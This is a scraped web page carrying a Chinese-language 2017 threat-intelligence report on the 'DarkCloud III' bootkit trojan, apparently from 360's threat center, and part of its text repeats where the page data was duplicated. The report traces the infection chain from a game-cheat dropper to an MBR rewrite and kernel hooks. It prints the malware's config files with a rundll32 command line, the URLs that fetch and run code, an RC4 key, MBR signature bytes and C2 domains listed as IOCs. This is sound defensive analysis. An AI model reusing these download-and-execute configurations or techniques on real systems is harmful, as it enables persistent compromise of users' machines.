href="https://mp.weixin.qq.com/s/MYbSHWHE4qpa0XJ3N6nAzw">https://mp.weixin.qq.com/s/MYbSHWHE4qpa0XJ3N6nAzw</a> <a class="footnote-backref" href="#fnref2">↩︎</a><li class="footnote-item" id="fn3"><p><a href="http://www.freebuf.com/articles/system/134017.html">http://www.freebuf.com/articles/system/134017.html</a> <a class="footnote-backref" href="#fnref3">↩︎</a></ol></section></div><div class="back-top" data-v-8db87e62></div></div></section></div></div><script type="text/javascript">window.__NUXT__={layout:"default",data:[{articleData:{_id:"597733a71c670a09e493ee3f",title:"暗云III木马技术分析报告",category:"事件追踪",readableId:"darkcloud3-botnet-technical-analysis",abstract:"2017年6月9日，关于一款名为“暗云III”木马的信息在互联网传播，据称此木马具有隐蔽性强、潜在危害大、传播范围广等特点。木马主要通过外挂、游戏辅助、私服登录器等传播，此类软件通常诱导用户关闭安全软件后使用，使得木马得以乘机植入。木马主要通过云控进行任务发布，传播及执行恶意功能时无文件写入磁盘，同时木马所具有的bootkit能力也使得木马的运行更加隐而且难以查杀。本报告对木马的相关技术进行分析，并提供解决方法和检查确认建议。",author:"马茂刚",headImg:"/uploads/2017/08/17/6f753d60b82a62ef66be632f502646cc.png",descImg:"/uploads/2017/08/01/f8ac5e02af0e3da2ff7436f8250cd7a9.png",tags:["DarkCloud","暗云3","暗云"],publish_time:"2017-06-14T15:27:52.000Z",content:'<h1 class="line" data-line="0">事件背景</h1>\n<p class="line" data-line="2">2017年6月9日，关于一款名为“暗云III”木马的信息在互联网传播，据称此木马具有隐蔽性强、潜在危害大、传播范围广等特点。木马主要通过外挂、游戏辅助、私服登录器等传播，此类软件通常诱导用户关闭安全软件后使用，使得木马得以乘机植入。木马主要通过云控进行任务发布，传播及执行恶意功能时无文件写入磁盘，同时木马所具有的bootkit能力也使得木马的运行更加隐而且难以查杀。本报告对木马的相关技术进行分析，并提供解决方法和检查确认建议。</p>\n<h2 class="line" data-line="4">目标样本</h2>\n<p class="line" data-line="6">360威胁情报中心得到了如下木马相关的样本，相关的基本信息如下：</p>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>BC5DEA3605878631B8FEEEB53BFB5B17</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件大小</strong></td>\n<td>1669784字节</td>\n</tr>\n<tr>\n<td class="text-right"><strong>时间戳</strong></td>\n<td>2016.12.24 16:52:15</td>\n</tr>\n<tr>\n<td class="text-right"><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-03-15 07:19:09 UTC</td>\n</tr>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>518f9e5b1fb6397a27a0851930625049</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件大小</strong></td>\n<td>48462字节</td>\n</tr>\n<tr>\n<td class="text-right"><strong>时间戳</strong></td>\n<td>2016.12.16 19:56:11</td>\n</tr>\n<tr>\n<td class="text-right"><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-05-24 22:33:38 UTC</td>\n</tr>\n</tbody>\n</table>\n</center>\n<h2 class="line" data-line="23">样本分析</h2>\n<h3 class="line" data-line="25">安装程序分析</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>BC5DEA3605878631B8FEEEB53BFB5B17</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件大小</strong></td>\n<td>1669784字节</td>\n</tr>\n<tr>\n<td class="text-right"><strong>时间戳</strong></td>\n<td>2016.12.24 16:52:15</td>\n</tr>\n<tr>\n<td class="text-right"><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-03-15 07:19:09 UTC</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="37">样本功能：</p>\n<p class="line" data-line="39">样本运行后显示正常游戏界面，会在后台解密payload，并在内存中动态到payload入口点执行，payload会搜集本机信息，拼接本机信息做为配置文件的下载地址，使用URLDownloadToFile下载配置文件，解析配置文件中的url字段、cmdline等字段，下载url字段中的内容并在内存中加载执行。</p>\n<p class="line" data-line="41">样本运行，显示正常游戏界面：</p>\n<p class="text-center line" data-line="43"><img src="/uploads/2017/07/25/8d3855a37f8ffd02687f20f6453d09d2.png" alt="" width="90%"></p>\n<p class="line" data-line="45">使用CallWindowProcW注册窗口事件：</p>\n<p class="text-center line" data-line="47"><img src="/uploads/2017/07/25/82fb7aa498073b3e2954ccae8cd970be.png" alt="" width="90%"></p>\n<p class="line" data-line="49">在窗口处理函数中，查找89号资源，加载该图片资源，在该图片资源图片偏移ED7C的位置，保存着可以执行的代码：</p>\n<p class="text-center line" data-line="51"><img src="/uploads/2017/07/25/5f9634e9176ef02f8ea69cb1b2350fd7.png" alt="" width="90%"></p>\n<p class="line" data-line="53">将图片偏移ED7C处的代码复制到新申请的内存中。</p>\n<p class="text-center line" data-line="55"><img src="/uploads/2017/07/25/741f41debd244b71db0a22d1a5f4c6a2.png" alt="" width="90%"></p>\n<p class="line" data-line="57">这段代码包含两部分内容：</p>\n<p class="text-center line" data-line="59"><img src="/uploads/2017/07/25/3e31f618818bf21ed704b04d4d8a4049.png" alt="" width="90%"></p>\n<p class="line" data-line="61">运行这段代码时，首先会运行前面部分的shellcode内容，shellcode会使用RtlDecompressBuffer函数在内存中解压被压缩过的PE文件：</p>\n<p class="text-center line" data-line="63"><img src="/uploads/2017/07/25/e7ea049d373a454193a95dad49ea0d20.png" alt="" width="90%"></p>\n<p class="line" data-line="65">对解压缩出的PE文件进行内存动态加载后到入口点执行：</p>\n<p class="text-center line" data-line="67"><img src="/uploads/2017/07/25/bd602bc9d44b44c728009b668ac44b87.png" alt="" width="90%"></p>\n<p class="line" data-line="69">这个内存解密出来的样本的功能为：</p>\n<p class="line" data-line="71">检测本机的环境（包括是否安装有360安全软件，是否是网吧环境，是否是虚拟机环境等），将收集到的客户端信息发送到http://c2tongji.b5156.com:89，服务器根据对本机环境做出判断返回不同内容。只有在满足特定环境的情况下，才会返回带有恶意下载链接的配置文件。而在木马的运行环境不符合木马作者的预期时，则不会返回恶意配置文件，以此来逃避安全软件查杀。</p>\n<p class="line" data-line="73">检测虚拟机的代码片段：</p>\n<p class="text-center line" data-line="75"><img src="/uploads/2017/07/25/54973d048e7febe6b07039866cae4eea.png" alt="" width="90%"></p>\n<p class="line" data-line="77">检测360安全软件的代码片段：</p>\n<p class="text-center line" data-line="79"><img src="/uploads/2017/07/25/e291e320f4497ac980561387b51413da.png" alt="" width="90%"></p>\n<p class="line" data-line="81">检测是否是网吧环境的代码片段：</p>\n<p class="text-center line" data-line="83"><img src="/uploads/2017/07/25/2c5253cef83ef09e1bc914411790624b.png" alt="" width="90%"></p>\n<p class="line" data-line="85">搜集用户信息，通过URLDownloadToFile下载配置文件到本地：</p>\n<p class="text-center line" data-line="87"><img src="/uploads/2017/07/25/7187ef685aaa1b25f1cce49994fa6c70.png" alt="" width="90%"></p>\n<p class="line" data-line="89">下载回来的配置文件的格式为：</p>\n<pre class="hljs"><code class="hljs">[Update] \n\nVersion=2 \nUrl=http://update.njmmy.com:8089/config/LDrvSvc.zip \nCmdLine=rundll32.exe LDrvSvc.dll,RundllInstall \nDir=%appdata%\\\\LDrvSvc\n</code></pre>\n<p class="line" data-line="100">随后对下载回来的配置文件进行解析后，使用CreateProcess加载从配置文件中URL字段的内容：</p>\n<p class="text-center line" data-line="102"><img src="/uploads/2017/07/25/3a276293536a6aae76052c69bd5e0009.png" alt="" width="90%"></p>\n<p class="line" data-line="104">此时下载的内容经过解密后在内存中执行，会尝试改写MBR。</p>\n<h4 class="line" data-line="106">MBR的改写</h4>\n<p class="line" data-line="108">此阶段木马的主要功能为：从上面的配置中下载回来的zip包中包含了驱动人生的白样本，木马利用驱动人生的白样本文件会尝试加载名为DtlCrashCatch.dll文件，而此文件是攻击者所提供的恶意代码，这是典型的白加黑绕过杀软的技巧，被国内恶意代码开发者所广泛使用。DtlCrashCatch.dll文件会从http://www.2tf1.com/upcfg.db 得到URL,从那个URL指向位置下载加密过的内容，在本地内存中解密后加载执行尝试修改用户计算机硬盘的MBR。</p>\n<p class="line" data-line="110">被恶意利用的白签名文件：</p>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>b3a4d017e51da2a3aef520d4836c6dc6</td>\n</tr>\n<tr>\n<td class="text-right"><strong>签名信息</strong></td>\n<td>Shenzhen DriveTheLife Software Technology Co.Ltd</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="text-center line" data-line="119"><img src="/uploads/2017/07/25/1f3867e09ed33b793a5d289b29c97a5b.png" alt=""></p>\n<p class="line" data-line="121">具体的过程为：</p>\n<p class="line" data-line="123">通过调用“rundll32.exe LDrvSvc.dll,RundllInstall Dir=%appdata%\\LDrvSvc”命令，将调用LDrvSvc.dll的RundllInstall函数,在RundllInstall函数中调用了HostInstall函数。</p>\n<p class="text-center line" data-line="125"><img src="/uploads/2017/07/25/85b5ec0409f383567f0b1549b690dacb.png" alt=""></p>\n<p class="line" data-line="127">而HostInstall函数会将在系统中注册LDrvSvc服务。</p>\n<p class="text-center line" data-line="129"><img src="/uploads/2017/07/25/3d6bec505975067b32d8763a840beb0c.png" alt="" width="99%"></p>\n<p class="line" data-line="131">随后以服务方式启动LDrvSvc.dll，这时会进入LDrvSvc.dll的ServiceMain函数。ServiceMain函数会加载DtlCrashCatch.dll文件</p>\n<p class="text-center line" data-line="133"><img src="/uploads/2017/07/25/298ad7bf8935ff4ead3d9db5c196f408.png" alt="" width="90%"></p>\n<p class="line" data-line="135">最终会调用DtlCrashCatch.dll的1001E889代码处：</p>\n<p class="text-center line" data-line="137"><img src="/uploads/2017/07/25/e0518563c8f545b78b5f883786ca2eab.png" alt=""></p>\n<p class="line" data-line="139">上述代码功能为通过CreateFileMapping和MappingViewOfFile解密指定尾部数据到一个共享内存，解密到共享内存中的代码shellcode，功能为调用RtlDecompressBuffer解密出PE并到PE入口点处执行。</p>\n<p class="line" data-line="141">这个PE的功能为从http://www.2tf1.com/upcfg.db下载文件，将文件使用RC4算法解密，并判断下载回来的文件前4个字节是不是0xA5A5A5A5，如果满足条件则从解密后的第4个字节处开始执行。</p>\n<p class="line" data-line="143">此处使用的RC4密钥的十六进制表示为：</p>\n<blockquote>\n<p>F4 70 75 3D 21 B7 D8 95 BE 49 48 C1 56 F6 A9 C1</p>\n</blockquote>\n<p class="line" data-line="147">下载配置文件代码片段：</p>\n<p class="text-center line" data-line="149"><img src="/uploads/2017/07/25/c95671370be5e1961e9eeef2cfbf49cc.png" alt=""></p>\n<p class="line" data-line="151">RC4解密后，比较0xA5A5A5A5代码片段：</p>\n<p class="text-center line" data-line="153"><img src="/uploads/2017/07/25/2c2b82a1842430ea939c019fcae7d322.png" alt=""></p>\n<p class="line" data-line="155">从解密出的代码+4处开始执行后，又会执行与前面类似的解密过程，先通过RtlDecompressBuffer解压缩代码后面部分压缩过的PE文件数据，随后动态加载PE后，到PE入口点执行。</p>\n<p class="line" data-line="157">这时解压缩的代码片段：</p>\n<p class="text-center line" data-line="159"><img src="/uploads/2017/07/25/ff178268784de66dbfc2e790fe8f0aba.png" alt="" width="90%"></p>\n<p class="line" data-line="161">内存加载PE代码片段：</p>\n<p class="text-center line" data-line="163"><img src="/uploads/2017/07/25/89ee096572aa2ca4e893c3ceccdafad7.png" alt="" width="90%"></p>\n<p class="line" data-line="165">内存中加载的这个PE文件才是最终真正的修改MBR的PE。</p>\n<p class="line" data-line="167">加载到内存后，判断ldrvsvc.dll模块的0x156C处是否为“0x8B 0x44 0x24 0x04 0x83 0xE8 0x01”（用来判断是不是已经被patch过），如果判断通过，就将ldrvsvc.dll模块的0x156C patch为”jmp 4C62D”：</p>\n<p class="text-center line" data-line="169"><img src="/uploads/2017/07/25/ffebc399af572d163059cbd8801783cb.png" alt="" width="90%"></p>\n<p class="line" data-line="171">用来对ldrvsvc.dll做patch的代码：</p>\n<p class="text-center line" data-line="173"><img src="/uploads/2017/07/25/eaa5a92ca28ffa2585bb5b50f2cc0cb6.png" alt=""></p>\n<p class="line" data-line="175">被patch后的ldrvsvc.dll，最终会被服务调用，进而执行写入MBR操作。为了防止对MBR的重复写入，木马在写入MBR操作前，会比较MBR是不是特征代码片段：</p>\n<blockquote>\n<p>31 C0 FA 31 DB 8E D3 36 89 26 FE 7B BC FE 7B 1E 66 60 8E DB 3E A1 13 04 24 FC 83 E8 40 3E A3 13</p>\n</blockquote>\n<p class="line" data-line="179">比较MBR是否已经被写入的代码片段：</p>\n<p class="text-center line" data-line="181"><img src="/uploads/2017/07/25/e9919d54440cdbb858292dcc0706ec22.png" alt=""></p>\n<p class="line" data-line="183">木马会把原始的MBR备份到系统第二扇区中，同时在第一扇区中写入恶意代码，在3-63扇区中写入加密过的恶意代码：</p>\n<p class="text-center line" data-line="185"><img src="/uploads/2017/07/25/9303d0fa513bcc7f95d6a2610f3229a9.png" alt="" width="90%"></p>\n<h4 class="line" data-line="187">Bootkit功能分析</h4>\n<p class="line" data-line="189">bootkit功能主要：在内核以TDI 的方式访问网络下载shellcode解密后直接在内核中运行。木马在TDI层用udp连接访问ms.maimai666.com的8064端口获取shellcode。如果失败改用tcp连接ms.maimai666.com的8864获取。得到的内容会在内存中解密，解密后以APC的形式插入到应用层进程中。插入到应用层的代码功能主要为：根据配置文件从 http://www.acsewle.com:8877/ds/cl.db 下载加密后的文件，文件解密后的样本功能在下一小节中分析。</p>\n<p class="line" data-line="191">由上一节对MBR写入过程的调试发现写入MBR后，系统第1个扇区的内容变为下图所示，这是木马的病毒代码：</p>\n<p class="text-center line" data-line="193"><img src="/uploads/2017/07/25/71529405f6d1bac7201e01935973b684.png" alt=""></p>\n<p class="line" data-line="195">系统第1扇区的代码功能为：将磁盘3-63扇区的木马主体加载到内存中解密执行。</p>\n<p class="line" data-line="197">解密部分代码片段：</p>\n<p class="text-center line" data-line="199"><img src="/uploads/2017/07/25/6c3762f4e13d6b9ae103399f3e440642.png" alt=""></p>\n<p class="line" data-line="201">这部分解密代码的功能是：挂钩系统的15号中断，随后读取第二扇区中的备份MBR正常地引导系统启动。</p>\n<p class="line" data-line="203">挂钩系统的15号中断代码片段：</p>\n<p class="text-center line" data-line="205"><img src="/uploads/2017/07/25/3bd39c11abd44bf2895bdd954e50eeeb.png" alt=""></p>\n<p class="line" data-line="207">挂钩成功后，使用第二扇区中备份的系统MBR正常地引导启动：</p>\n<p class="text-center line" data-line="209"><img src="/uploads/2017/07/25/6fe270ce10943e6b8b4716e24f5546dc.png" alt=""></p>\n<p class="line" data-line="211">INT 15中断向量被挂钩前后对比图：</p>\n<p class="text-center line" data-line="213"><img src="/uploads/2017/07/25/7cb1bab3e81c2ef56c7a341beb23469b.png" alt=""></p>\n<p class="line" data-line="215">随后，bootkit会挂钩BILoadImageEx函数、ntoskrnl入口点等。此外，木马还会根据磁盘类型和操作系统替换DriverStartIo、 AtapiHwStartIo、RaUnitStartIo等函数，从而阻止其他程序读取磁盘原始MBR。当检测到读MBR时，返回一个正常的MBR，检测到写MBR时，则直接忽略该操作。这就导致了系统中毒之后，如果木马作者没有打开云控开关的情况会，很难察觉电脑中毒。</p>\n<p class="line" data-line="217">这样，当系统下次启动时，系统引导会通过int 15中断查询内存信息，此时挂钩15号中断的木马便得以第二次获得CPU控制权，获得控制权后木马挂钩BILoadImageEx函数，调用原始15号中断并将控制权交回给系统继续引导。</p>\n<p class="line" data-line="219">当系统引导代码调用BILoadImageEx加载ntoskrnl.exe时，木马便第三次获得控制权，获得控制权后木马再一次执行挂钩操作，此次挂钩的位置是ntoskrnl.exe的入口点，随后将控制权交给系统继续引导。</p>\n<p class="line" data-line="221">当引导完毕进入windows内核时，挂钩ntoskrnl入口点的木马代码第四次获得CPU控制权，此时木马已真正进入windows内核中，获得控制权后，分配一块内存空间，将木马内核的主功能代码拷贝到分配的空间中，并通过创建PsSetCreateThreadNotifyRoutine回调的方式使主功能代码得以执行。至此完成木马由MBR到windows内核的加载过程<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup> <sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup> <sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>。</p>\n<h3 class="line" data-line="223">Bootkit所加载木马的分析</h3>\n<p class="line" data-line="225">对bootkit从云端加载的木马进行分析，文件基本信息：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>518f9e5b1fb6397a27a0851930625049</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>48462字节</td>\n</tr>\n<tr>\n<td><strong>时间戳</strong></td>\n<td>2016.12.16 19:56:11</td>\n</tr>\n<tr>\n<td><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-05-24 22:33:38 UTC</td>\n</tr>\n</tbody>\n</table>\n<p class="line" data-line="235">样本功能：</p>\n<p class="line" data-line="237">访问http://www.acsewle.com:8877/ds/kn.html下载配置文件，解析配置文件中的appurl字段，下载appurl字段的url，根据配置文件中ispe为1，则通过CreateProcess直接加载执行。如果配置文件中ispe为0，则解析下载回来的非PE文件，RC4解密该非PE文件，得到PE加载代码与PE文件，以傀儡进程方式注入svchost.exe，，最后通过解密出来的PE加密代码加载解密出来的PE文件。</p>\n<p class="line" data-line="239">细节如下：</p>\n<p F020C369-7CD6-41ea-A91F-3C52F1B72D0B="" class="line" data-line="241">通过事件实现单一进程运行的，事件名：</p>\n<p class="text-center line" data-line="243"><img src="/uploads/2017/07/25/ee925085321838256ca7379b7d541a5c.png" alt="" width="90%"></p>\n<p class="line" data-line="245">下载配置文件到临时文件中：</p>\n<p class="text-center line" data-line="247"><img src="/uploads/2017/07/25/ac003626642fae3c6d6fd7333b850b35.png" alt="" width="90%"></p>\n<p class="line" data-line="249">访问http://www.acsewle.com:8877/ds/kn.html</p>\n<p class="text-center line" data-line="251"><img src="/uploads/2017/07/25/1995c6346babc733157075ea21684beb.png" alt="" width="90%"></p>\n<pre class="hljs"><code class="hljs">[Config] \n\nversion = 890 \nisexe = 0 \nappurl = http://www.acsewle.com:8877/ds/lcdn.db\n</code></pre>\n<p class="line" data-line="261">解析CONFIG中的配置项目：</p>\n<p class="text-center line" data-line="263"><img src="/uploads/2017/07/25/7c89e9c3ef5433b36e5e3d3a8b485eb0.png" alt="" width="90%"></p>\n<p class="line" data-line="265">解析出 appurl后，会下载appurl的地址到临时文件。</p>\n<p class="line" data-line="267">下载回来的代码如下：</p>\n<p class="text-center line" data-line="269"><img src="/uploads/2017/07/25/8011249a08c35bcff43e61df03a865c6.png" alt="" width="90%"></p>\n<p class="line" data-line="271">其中的格式为：</p>\n<p class="line" data-line="273">前面8字节为“SLDREXEC”，标识字符，图中黑色框部分。绿色框部分为加密过的shellcode的长度。红色框部分为加密shellcode时使用的RC4密钥。褐色框部分为加密过的shellcode的内容。</p>\n<p class="line" data-line="275">使用RC4算法将上面的褐色框部分解密后的内容分为两部分：</p>\n<p class="line" data-line="277">第一部分为代码片段，用于动态加载PE文件</p>\n<p class="line" data-line="279">第二部分为完整的PE文件，从文件偏移0x328处就是一个完整的PE文件。</p>\n<p class="line" data-line="281">PE文件片段如下：</p>\n<p class="text-center line" data-line="283"><img src="/uploads/2017/07/25/1b869ed9bd514c6c38358ca3f43d7a7a.png" alt=""></p>\n<p class="line" data-line="285">解密出来的注入代码如下：</p>\n<p class="text-center line" data-line="287"><img src="/uploads/2017/07/25/e99266a00fd896a3fa8c4170c2fb1524.png" alt=""></p>\n<p class="line" data-line="289">将上面解密出的内容注入到svchost.exe中执行：</p>\n<p class="text-center line" data-line="291"><img src="/uploads/2017/07/25/b3d8df3c0753fb1471a8d799438fc0fe.png" alt=""></p>\n<p class="line" data-line="293">注入到svhost.exe中的代码包含上面所有的解密内容（包括代码片段与完整的PE文件）。</p>\n<p class="line" data-line="295">代码片段的功能是动态获得函数地址，在内存中加载解密出的PE文件：</p>\n<p class="text-center line" data-line="297"><img src="/uploads/2017/07/25/87dd47533d79cd2cf6f30413e34b0a03.png" alt=""></p>\n<p class="line" data-line="299">内存加载PE并到入口点执行</p>\n<p class="text-center line" data-line="301"><img src="/uploads/2017/07/25/aff38627a0c9b0bc69e7fa6ffafcffe3.png" alt=""></p>\n<p class="line" data-line="303">Payload使用了UPX压缩。Payload的功能为，从网上下载lua脚本保存到临时文件，随后使用PE中内置的lua解析程序运行下载的lua脚本。</p>\n<p class="line" data-line="305">从http://www.acsewle.com:8877/ld/ndn.db下载lua脚本到本地：</p>\n<p class="text-center line" data-line="307"><img src="/uploads/2017/07/25/7c279c462a1596b8df87df2f5e2c222c.png" alt="" width="90%"></p>\n<p class="line" data-line="309">使用PE中内置的lua解析器执行lua脚本：</p>\n<p class="text-center line" data-line="311"><img src="/uploads/2017/07/25/9447657683fe2e8c03b9beb7405af3dc.png" alt="" width="90%"></p>\n<p class="line" data-line="313">木马根据云端配置不同的lua脚本实现不同的功能。主要不同的lua的功能包括：统计受害机器信息功能，发动DDOS攻击功能，发起CC攻击功能等。</p>\n<h2 class="line" data-line="315">解决方案</h2>\n<p class="line" data-line="317">从以上的技术分析可以看到，暗云木马感染了MBR，即使重装系统，MBR里的恶意代码还会联网下载木马病毒执行。目前比较稳妥的解决办法是使用360急救箱的强力模式进行系统扫描，360急救箱强力模式会重启系统先于木马启动，从而彻底清除MBR中恶意代码，恢复系统正常MBR。</p>\n<p class="line" data-line="319">360急救箱下载地址：<a href="http://down.360safe.com/360c0mpkill5.1.64.1183-0605.zip">http://down.360safe.com/360c0mpkill5.1.64.1183-0605.zip</a></p>\n<h2 class="line" data-line="321">IOC</h2>\n<p class="line" data-line="323">由于木马一旦感染会先于操作系统启动，在本地进行检查会变得非常困难，但由于木马有相对固定的网络行为，由于可以在网络出口尝试匹配如下URL及相应域名访问尝试，由可以比较有效低成本的发现中招系统。我们提供如下的URL IOC：</p>\n<p class="line" data-line="325">http://www.acsewle.com:8877/ds/kn.html</p>\n<p class="line" data-line="327">http://ms.maimai666.com</p>\n<p class="line" data-line="329">http://www.acsewle.com:8877/ds/cl.db</p>\n<p class="line" data-line="331">http://www.acsewle.com:8877/ds/lcdn.db</p>\n<p class="line" data-line="333">http://www.acsewle.com:8877/ds/ndn.db</p>\n<p class="line" data-line="335">http://www.2tf1.com/upcfg.db</p>\n<p class="line" data-line="337">http://update.njmmy.com:8089/config/LDrvSvc.zip</p>\n<p class="line" data-line="339">http://www.acsewle.com:8877/um.php</p>\n<h2 class="line" data-line="341">参考信息</h2>\n<hr class="footnotes-sep">\n<section class="footnotes">\n<ol class="footnotes-list">\n<li id="fn1" class="footnote-item"><p><a href="http://bbs.guanjia.qq.com/forum.php?mod=viewthread&amp;tid=5307974">http://bbs.guanjia.qq.com/forum.php?mod=viewthread&amp;tid=5307974</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>\n</li>\n<li id="fn2" class="footnote-item"><p><a href="https://mp.weixin.qq.com/s/MYbSHWHE4qpa0XJ3N6nAzw">https://mp.weixin.qq.com/s/MYbSHWHE4qpa0XJ3N6nAzw</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>\n</li>\n<li id="fn3" class="footnote-item"><p><a href="http://www.freebuf.com/articles/system/134017.html">http://www.freebuf.com/articles/system/134017.html</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>\n</li>\n</ol>\n</section>\n'}}],error:null,state:{pageId:[],tagParam:[],isMainPage:!1,pageNum:[1,2],articleData:{_id:"597733a71c670a09e493ee3f",title:"暗云III木马技术分析报告",category:"事件追踪",readableId:"darkcloud3-botnet-technical-analysis",abstract:"2017年6月9日，关于一款名为“暗云III”木马的信息在互联网传播，据称此木马具有隐蔽性强、潜在危害大、传播范围广等特点。木马主要通过外挂、游戏辅助、私服登录器等传播，此类软件通常诱导用户关闭安全软件后使用，使得木马得以乘机植入。木马主要通过云控进行任务发布，传播及执行恶意功能时无文件写入磁盘，同时木马所具有的bootkit能力也使得木马的运行更加隐而且难以查杀。本报告对木马的相关技术进行分析，并提供解决方法和检查确认建议。",author:"马茂刚",headImg:"/uploads/2017/08/17/6f753d60b82a62ef66be632f502646cc.png",descImg:"/uploads/2017/08/01/f8ac5e02af0e3da2ff7436f8250cd7a9.png",tags:["DarkCloud","暗云3","暗云"],publish_time:"2017-06-14T15:27:52.000Z",content:'<h1 class="line" data-line="0">事件背景</h1>\n<p class="line" data-line="2">2017年6月9日，关于一款名为“暗云III”木马的信息在互联网传播，据称此木马具有隐蔽性强、潜在危害大、传播范围广等特点。木马主要通过外挂、游戏辅助、私服登录器等传播，此类软件通常诱导用户关闭安全软件后使用，使得木马得以乘机植入。木马主要通过云控进行任务发布，传播及执行恶意功能时无文件写入磁盘，同时木马所具有的bootkit能力也使得木马的运行更加隐而且难以查杀。本报告对木马的相关技术进行分析，并提供解决方法和检查确认建议。</p>\n<h2 class="line" data-line="4">目标样本</h2>\n<p class="line" data-line="6">360威胁情报中心得到了如下木马相关的样本，相关的基本信息如下：</p>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>BC5DEA3605878631B8FEEEB53BFB5B17</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件大小</strong></td>\n<td>1669784字节</td>\n</tr>\n<tr>\n<td class="text-right"><strong>时间戳</strong></td>\n<td>2016.12.24 16:52:15</td>\n</tr>\n<tr>\n<td class="text-right"><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-03-15 07:19:09 UTC</td>\n</tr>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>518f9e5b1fb6397a27a0851930625049</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件大小</strong></td>\n<td>48462字节</td>\n</tr>\n<tr>\n<td class="text-right"><strong>时间戳</strong></td>\n<td>2016.12.16 19:56:11</td>\n</tr>\n<tr>\n<td class="text-right"><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-05-24 22:33:38 UTC</td>\n</tr>\n</tbody>\n</table>\n</center>\n<h2 class="line" data-line="23">样本分析</h2>\n<h3 class="line" data-line="25">安装程序分析</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>BC5DEA3605878631B8FEEEB53BFB5B17</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td class="text-right"><strong>文件大小</strong></td>\n<td>1669784字节</td>\n</tr>\n<tr>\n<td class="text-right"><strong>时间戳</strong></td>\n<td>2016.12.24 16:52:15</td>\n</tr>\n<tr>\n<td class="text-right"><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-03-15 07:19:09 UTC</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="37">样本功能：</p>\n<p class="line" data-line="39">样本运行后显示正常游戏界面，会在后台解密payload，并在内存中动态到payload入口点执行，payload会搜集本机信息，拼接本机信息做为配置文件的下载地址，使用URLDownloadToFile下载配置文件，解析配置文件中的url字段、cmdline等字段，下载url字段中的内容并在内存中加载执行。</p>\n<p class="line" data-line="41">样本运行，显示正常游戏界面：</p>\n<p class="text-center line" data-line="43"><img src="/uploads/2017/07/25/8d3855a37f8ffd02687f20f6453d09d2.png" alt="" width="90%"></p>\n<p class="line" data-line="45">使用CallWindowProcW注册窗口事件：</p>\n<p class="text-center line" data-line="47"><img src="/uploads/2017/07/25/82fb7aa498073b3e2954ccae8cd970be.png" alt="" width="90%"></p>\n<p class="line" data-line="49">在窗口处理函数中，查找89号资源，加载该图片资源，在该图片资源图片偏移ED7C的位置，保存着可以执行的代码：</p>\n<p class="text-center line" data-line="51"><img src="/uploads/2017/07/25/5f9634e9176ef02f8ea69cb1b2350fd7.png" alt="" width="90%"></p>\n<p class="line" data-line="53">将图片偏移ED7C处的代码复制到新申请的内存中。</p>\n<p class="text-center line" data-line="55"><img src="/uploads/2017/07/25/741f41debd244b71db0a22d1a5f4c6a2.png" alt="" width="90%"></p>\n<p class="line" data-line="57">这段代码包含两部分内容：</p>\n<p class="text-center line" data-line="59"><img src="/uploads/2017/07/25/3e31f618818bf21ed704b04d4d8a4049.png" alt="" width="90%"></p>\n<p class="line" data-line="61">运行这段代码时，首先会运行前面部分的shellcode内容，shellcode会使用RtlDecompressBuffer函数在内存中解压被压缩过的PE文件：</p>\n<p class="text-center line" data-line="63"><img src="/uploads/2017/07/25/e7ea049d373a454193a95dad49ea0d20.png" alt="" width="90%"></p>\n<p class="line" data-line="65">对解压缩出的PE文件进行内存动态加载后到入口点执行：</p>\n<p class="text-center line" data-line="67"><img src="/uploads/2017/07/25/bd602bc9d44b44c728009b668ac44b87.png" alt="" width="90%"></p>\n<p 